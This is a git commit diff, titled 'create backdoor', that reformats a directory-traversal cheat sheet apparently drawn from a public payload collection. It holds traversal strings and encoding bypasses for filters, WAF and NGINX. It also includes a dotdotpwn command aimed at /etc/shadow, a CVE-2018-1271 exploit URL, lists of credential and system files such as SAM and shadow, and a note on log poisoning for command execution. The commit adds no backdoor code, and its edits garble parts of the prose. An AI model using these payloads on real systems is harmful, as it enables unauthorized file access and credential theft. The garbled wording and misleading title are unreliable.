3eb3f0380e10dbd0344eb87ce1f6417cfc1e0188
Z4 <30985576+TheProdigyLeague@users.noreply.github.com>
2023-03-28 22:28:04 -0400

    create backdoor
    更新！

--- PATH Injection/dir.bash
+++ PATH Injection/dir.bash
@@ -1,6 +1,9 @@
 # Directory traversal
 
-> A directory or path traversal consists in exploiting insufficient security validation / sanitization of user-supplied input file names, so that characters representing "traverse to parent directory" are passed through to the file APIs.
+>/dir [PATH] traversal
+..
+>exploit insufficient security validation/sanitization of end-user-supplied-input-file-names 
+>chars representing "traverse to parent directory" are passed through to file/APIs.
 
 ## Summary
 
@@ -17,19 +20,15 @@
     * [Interesting Linux files](#interesting-linux-files)
     * [Interesting Windows files](#interesting-windows-files)
 * [References](#references)
-
 ## Tools
-
 - [dotdotpwn - https://github.com/wireghoul/dotdotpwn](https://github.com/wireghoul/dotdotpwn)
     ```powershell
     git clone https://github.com/wireghoul/dotdotpwn
     perl dotdotpwn.pl -h 10.10.10.10 -m ftp -t 300 -f /etc/shadow -s -q -b
     ```
-
-## Basic exploitation
-
-We can use the `..` characters to access the parent directory, the following strings are several encoding that can help you bypass a poorly implemented filter.
-
+## Basic exploitation | -use `..` chars | -access | -parent_dir
+>follow strings
+>encoding can help bypass a poor imp-filter.
 ```powershell
 ../
 ..\
@@ -40,69 +39,48 @@ We can use the `..` characters to access the parent directory, the following str
 %uff0e%uff0e%u2215
 %uff0e%uff0e%u2216
 ```
-
 ### 16 bits Unicode encoding
-
 ```powershell
 . = %u002e
 / = %u2215
 \ = %u2216
 ```
-
 ### UTF-8 Unicode encoding
-
 ```powershell
 . = %c0%2e, %e0%40%ae, %c0ae
 / = %c0%af, %e0%80%af, %c0%2f
 \ = %c0%5c, %c0%80%5c
 ```
-
-### Bypass "../" replaced by ""
-Sometimes you encounter a WAF which remove the "../" characters from the strings, just duplicate them.
-
+$ --bypass "../" replaced by ""
+# Sometimes you encounter a WAF which remove the "../" characters from the strings, duplicate them.
 ```powershell
 ..././
 ...\.\
 ```
-
 ### Bypass "../" with ";"
-
 ```powershell
 ..;/
 http://domain.tld/page.jsp?include=..;/..;/sensitive.txt 
 ```
-
 ### Double URL encoding
-
 ```powershell
 . = %252e
 / = %252f
 \ = %255c
 ```
-
 **e.g:** Spring MVC Directory Traversal Vulnerability (CVE-2018-1271) with `http://localhost:8080/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini`
-
 ### UNC Bypass
-
-An attacker can inject a Windows UNC share ('\\UNC\share\name') into a software system to potentially redirect access to an unintended location or arbitrary file.
-
+>An attacker can inject a Windows UNC share ('\\UNC\share\name') into a software system to potentially redirect access to an unintended location or arbitrary file.
 ```powershell
 \\localhost\c$\windows\win.ini
 ```
-
 ### NGINX/ALB Bypass
-
 NGINX in certain configurations and ALB can block traversal attacks in the route, For example:
 ```http://nginx-server/../../``` will return a 400 bad request.
-
 To bypass this behaviour just add forward slashes in front of the url:
 ```http://nginx-server////////../../```
-
-
 ## Path Traversal
-
 ### Interesting Linux files
-
 ```powershell
 /etc/issue
 /etc/passwd
@@ -132,12 +110,9 @@ To bypass this behaviour just add forward slashes in front of the url:
 /var/lib/mlocate/mlocate.db
 /var/lib/mlocate.db
 ```
-
 ### Interesting Windows files
-
-Always existing file in recent Windows machine. 
-Ideal to test path traversal but nothing much interesting inside...
-
+There is always an existing file in recent Windows machine. 
+It is ideal to test the value of path-traversal but there is not much of interest inside...
 ```powershell
 c:\windows\system32\license.rtf
 c:\windows\system32\eula.txt
@@ -170,7 +145,7 @@ c:/windows/repair/sam
 c:/windows/repair/system
 ```
 
-The following log files are controllable and can be included with an evil payload to achieve a command execution
+>The following log files are controllable and can be included with an evil payload to achieve a command execution
 
 ```powershell
 /var/log/apache/access.log
